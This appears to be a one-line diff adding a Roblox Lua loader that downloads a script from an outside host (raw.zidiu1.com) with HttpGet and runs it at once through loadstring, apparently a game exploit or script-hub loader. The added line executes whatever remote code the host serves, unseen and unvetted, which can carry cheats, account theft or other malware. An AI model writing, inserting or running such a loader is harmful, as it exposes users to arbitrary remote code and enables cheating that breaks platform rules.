@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.zidiu1.com/LoS/LoS.lua"))()
